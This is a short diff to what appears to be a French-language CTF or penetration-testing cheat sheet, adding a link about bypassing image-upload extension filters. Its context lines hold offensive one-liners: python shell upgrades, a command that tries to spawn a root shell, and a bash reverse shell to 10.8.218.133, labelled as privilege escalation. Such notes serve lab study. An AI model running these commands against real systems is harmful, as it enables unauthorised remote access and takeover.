@@ -15,6 +15,8 @@
 	- `python -c 'import pty;pty.spawn (‘’/bin/bash’’)’`
 	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
 
+- [Bypass extension](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)
+
 - `bash -i >& /dev/tcp/10.8.218.133/80 0>&1` --> Elévation de privilèges
 
 ### Tools
